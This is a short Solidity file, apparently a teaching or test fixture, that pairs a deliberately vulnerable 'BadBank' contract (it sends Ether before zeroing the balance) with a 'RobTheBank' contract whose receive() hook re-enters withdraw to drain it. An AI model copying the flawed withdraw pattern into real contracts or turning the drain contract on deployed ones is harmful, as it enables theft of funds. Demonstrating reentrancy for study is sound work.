// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.28;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract BadBank {
    using Address for address;
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        Address.sendValue(payable(msg.sender), balance);
        balances[msg.sender] = 0;
    }
}

contract RobTheBank {
    BadBank public bank;
    uint256 private attackAmount;

    constructor(address _bank) {
        bank = BadBank(_bank);
    }

    function rob() public payable {
        attackAmount = msg.value;
        bank.deposit{value: attackAmount}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw();
        }
    }
}
